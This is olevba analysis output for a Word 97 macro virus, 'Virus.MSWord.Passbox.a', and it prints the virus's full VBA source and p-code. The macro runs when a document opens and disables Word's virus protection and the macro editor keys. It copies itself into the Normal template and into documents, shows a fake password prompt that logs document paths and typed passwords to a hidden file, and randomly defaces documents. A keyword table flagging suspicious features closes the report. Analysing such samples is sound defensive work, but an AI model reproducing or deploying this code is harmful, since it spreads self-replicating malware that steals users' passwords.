olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Passbox.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Ômega 
in file: Virus.MSWord.Passbox.a - OLE stream: 'Ômega'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Final

Infecta
Rotula
Tempo

Final:
End Sub
Sub Infecta()
On Error GoTo Final
       
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone

   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   
   Application.EnableCancelKey = wdCancelDisabled
   
   CustomizationContext = NormalTemplate
   FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
   FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
   

   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate

   DocumentInstalled = False
   GlobalInstalled = False
   
   For I = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(I).Name = "Ômega" Then
         DocumentInstalled = True
      End If
   Next

   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "Ômega" Then
         GlobalInstalled = True
      End If
   Next
   
      If DocumentInstalled = False Then
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Ômega", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
      End If
           
     
      If GlobalInstalled = False Then
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Ômega", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
      End If
    
      If ActiveDocument.HasPassword = False Then GoTo Final
      PassBox.Show
      
Final:
    End Sub
Sub Rotula()
On Error GoTo CMB

   Set FMB = CommandBars.FindControl(Type:=msoControlPopup, ID:=1)
 With FMB
    If .Caption = " " Then GoTo Final
 End With

CMB:
    Set MB = CommandBars.ActiveMenuBar
    Set NM = MB.Controls.Add(Type:=msoControlPopup, Before:=11)
  NM.Caption = " "
    Set BM = NM.Controls _
      .Add(Type:=msoControlButton, ID:=1)
  BM.Caption = "Ômega"
  BM.FaceId = 308
  BM.OnAction = "Show"
         
Final:
        
End Sub
Sub Show()
 Assistant.Visible = True
        With Assistant.NewBalloon
       .Icon = msoIconTip
       .Heading = "ÔMEGA"
       .Text = "       Word97.Macro  " + Chr(13) + Chr(13) + "        By ORiGaME"
       .Show
        End With

End Sub
Sub Analise()
If PassBox.TextBox1 = "" Then
   ActiveDocument.Close
   Unload PassBox
   Else
   Grava
End If

End Sub

Sub Grava()
On Error Resume Next
SetAttr "C:\IO.SDX", 0
Open "C:\IO.SDX" For Append As #1
Print #1, "Path = " + ActiveDocument.FullName
Print #1, "Password = " + PassBox.TextBox1
Print #1, " "
Close #1
SetAttr "C:\IO.SDX", 1 + 2 + 4

Unload PassBox
Application.DisplayAlerts = wdAlertsAll

End Sub

Sub ViewVBCode()

End Sub

Sub Tempo()
On Error GoTo Final
If WeekDay(Now()) = Int(Rnd() * 7 + 1) Then

Set OM = ActiveDocument.Range(Start:=0, End:=0)
 With OM
 .InsertBefore "ÔMEGA" & Chr(13) & "By ORiGaME ©"
 .Font.Name = "Impact"
 .Font.Size = 50
 .Font.ColorIndex = 9
 .Font.Animation = 6
 .Font.Shadow = 1
 End With
End If

Final:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PassBox 
in file: Virus.MSWord.Passbox.a - OLE stream: 'PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






































Private Sub CommandButton1_Click()
If CommandButton1.Caption = "OK" Then Analise
End Sub
Private Sub TextBox1_Change()
TextBox1.PasswordChar = "*"

End Sub
Private Sub UserForm_Initialize()
Label2.Caption = "Insira a senha para abrir o arquivo"
Label1.Caption = ActiveDocument.FullName

End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
On Error GoTo Final
Analise

Final:
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Passbox.a - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Passbox.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1334 bytes
' Macros/VBA/Ômega - 13480 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError Final 
' Line #2:
' Line #3:
' 	ArgsCall Infecta 0x0000 
' Line #4:
' 	ArgsCall Rotula 0x0000 
' Line #5:
' 	ArgsCall Tempo 0x0000 
' Line #6:
' Line #7:
' 	Label Final 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub Infecta())
' Line #10:
' 	OnError Final 
' Line #11:
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #13:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #14:
' Line #15:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' Line #18:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #19:
' Line #20:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #21:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF8 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #22:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #23:
' Line #24:
' Line #25:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #26:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #27:
' Line #28:
' 	LitVarSpecial (False)
' 	St DocumentInstalled 
' Line #29:
' 	LitVarSpecial (False)
' 	St GlobalInstalled 
' Line #30:
' Line #31:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #32:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Ômega"
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St DocumentInstalled 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Next 
' Line #36:
' Line #37:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #38:
' 	Ld J 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Ômega"
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Next 
' Line #42:
' Line #43:
' 	Ld DocumentInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Ômega"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #45:
' 	Ld ActiveDoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #46:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "PassBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #47:
' 	Ld ActiveDoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #48:
' 	EndIfBlock 
' Line #49:
' Line #50:
' Line #51:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #52:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Ômega"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #53:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #54:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "PassBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #55:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' 	Ld ActiveDocument 
' 	MemLd HasPassword 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Final 
' 	EndIf 
' Line #59:
' 	Ld PassBox 
' 	ArgsMemCall Show 0x0000 
' Line #60:
' Line #61:
' 	Label Final 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub Rotula())
' Line #64:
' 	OnError CMB 
' Line #65:
' Line #66:
' 	SetStmt 
' 	Ld msoControlPopup 
' 	ParamNamed TypeOf 
' 	LitDI2 0x0001 
' 	ParamNamed ID 
' 	Ld CommandBars 
' 	ArgsMemLd FindControl 0x0002 
' 	Set FMB 
' Line #67:
' 	StartWithExpr 
' 	Ld FMB 
' 	With 
' Line #68:
' 	MemLdWith Caption 
' 	LitStr 0x0001 " "
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Final 
' 	EndIf 
' Line #69:
' 	EndWith 
' Line #70:
' Line #71:
' 	Label CMB 
' Line #72:
' 	SetStmt 
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	Set MB 
' Line #73:
' 	SetStmt 
' 	Ld msoControlPopup 
' 	ParamNamed TypeOf 
' 	LitDI2 0x000B 
' 	ParamNamed Before 
' 	Ld MB 
' 	MemLd Controls 
' 	ArgsMemLd Add 0x0002 
' 	Set NM 
' Line #74:
' 	LitStr 0x0001 " "
' 	Ld NM 
' 	MemSt Caption 
' Line #75:
' 	LineCont 0x0004 06 00 06 00
' 	SetStmt 
' 	Ld msoControlButton 
' 	ParamNamed TypeOf 
' 	LitDI2 0x0001 
' 	ParamNamed ID 
' 	Ld NM 
' 	MemLd Controls 
' 	ArgsMemLd Add 0x0002 
' 	Set BM 
' Line #76:
' 	LitStr 0x0005 "Ômega"
' 	Ld BM 
' 	MemSt Caption 
' Line #77:
' 	LitDI2 0x0134 
' 	Ld BM 
' 	MemSt FaceId 
' Line #78:
' 	LitStr 0x0004 "Show"
' 	Ld BM 
' 	MemSt OnAction 
' Line #79:
' Line #80:
' 	Label Final 
' Line #81:
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Sub Show())
' Line #84:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #85:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #86:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #87:
' 	LitStr 0x0005 "ÔMEGA"
' 	MemStWith Heading 
' Line #88:
' 	LitStr 0x0015 "       Word97.Macro  "
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "        By ORiGaME"
' 	Add 
' 	MemStWith Then 
' Line #89:
' 	ArgsMemCallWith Show 0x0000 
' Line #90:
' 	EndWith 
' Line #91:
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub Analise())
' Line #94:
' 	Ld PassBox 
' 	MemLd TextBox1 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #95:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #96:
' 	Ld PassBox 
' 	ArgsCall Unlock 0x0001 
' Line #97:
' 	ElseBlock 
' Line #98:
' 	ArgsCall Grava 0x0000 
' Line #99:
' 	EndIfBlock 
' Line #100:
' Line #101:
' 	EndSub 
' Line #102:
' Line #103:
' 	FuncDefn (Sub Grava())
' Line #104:
' 	OnError (Resume Next) 
' Line #105:
' 	LitStr 0x0009 "C:\IO.SDX"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #106:
' 	LitStr 0x0009 "C:\IO.SDX"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Path = "
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Add 
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Password = "
' 	Ld PassBox 
' 	MemLd TextBox1 
' 	Add 
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 " "
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #111:
' 	LitStr 0x0009 "C:\IO.SDX"
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' Line #112:
' Line #113:
' 	Ld PassBox 
' 	ArgsCall Unlock 0x0001 
' Line #114:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #115:
' Line #116:
' 	EndSub 
' Line #117:
' Line #118:
' 	FuncDefn (Sub ViewVBCode())
' Line #119:
' Line #120:
' 	EndSub 
' Line #121:
' Line #122:
' 	FuncDefn (Sub Tempo())
' Line #123:
' 	OnError Final 
' Line #124:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0007 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Eq 
' 	IfBlock 
' Line #125:
' Line #126:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	ParamNamed Start 
' 	LitDI2 0x0000 
' 	ParamNamed End 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	Set OM 
' Line #127:
' 	StartWithExpr 
' 	Ld OM 
' 	With 
' Line #128:
' 	LitStr 0x0005 "ÔMEGA"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "By ORiGaME ©"
' 	Concat 
' 	ArgsMemCallWith InsertBefore 0x0001 
' Line #129:
' 	LitStr 0x0006 "Impact"
' 	MemLdWith Font 
' 	MemSt New 
' Line #130:
' 	LitDI2 0x0032 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #131:
' 	LitDI2 0x0009 
' 	MemLdWith Font 
' 	MemSt ColorIndex 
' Line #132:
' 	LitDI2 0x0006 
' 	MemLdWith Font 
' 	MemSt Animation 
' Line #133:
' 	LitDI2 0x0001 
' 	MemLdWith Font 
' 	MemSt Shadow 
' Line #134:
' 	EndWith 
' Line #135:
' 	EndIfBlock 
' Line #136:
' Line #137:
' 	Label Final 
' Line #138:
' 	EndSub 
' Macros/VBA/PassBox - 5609 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #39:
' 	Ld CommandButton1 
' 	MemLd Caption 
' 	LitStr 0x0002 "OK"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Analise 0x0000 
' 	EndIf 
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Private Sub TextBox1_Change())
' Line #42:
' 	LitStr 0x0001 "*"
' 	Ld TextBox1 
' 	MemSt PasswordChar 
' Line #43:
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #46:
' 	LitStr 0x0023 "Insira a senha para abrir o arquivo"
' 	Ld Label2 
' 	MemSt Caption 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld Label1 
' 	MemSt Caption 
' Line #48:
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #51:
' 	OnError Final 
' Line #52:
' 	ArgsCall Analise 0x0000 
' Line #53:
' Line #54:
' 	Label Final 
' Line #55:
' 	EndSub 
' Line #56:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.a' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.a' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.a' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.a' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancelar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.a' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.a' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Passbox.a' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Passbox.a' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Passbox.a' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Passbox.a' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Passbox.a' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

